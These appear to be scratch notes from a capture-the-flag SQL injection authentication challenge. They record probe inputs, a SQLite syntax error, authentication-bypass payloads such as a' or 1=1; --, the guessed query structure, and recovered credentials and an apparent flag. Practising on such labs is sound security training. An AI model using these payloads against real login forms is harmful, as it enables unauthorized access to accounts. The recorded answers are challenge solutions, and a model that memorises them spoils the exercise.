-- SQL injection - authentication

a '
a '

Warning: SQLite3::query(): Unable to prepare statement: 1, near "a": syntax error in /challenge/web-serveur/ch9/index.php on line 38
near "a": syntax error


username: admin

a' or 1=1; --
'
user1
TYsgv75zgtq


a' or 1=1 ORDER BY username ASC; --


a' or 1=1; select 1, 2 from users; --


SELECT ?, ?, ? FROM ? WHERE username = "<username>" AND password = ">password>"

SELECT ?, ?, ? FROM ? WHERE username = "user1" AND password = ">password>"

t0_W34k!$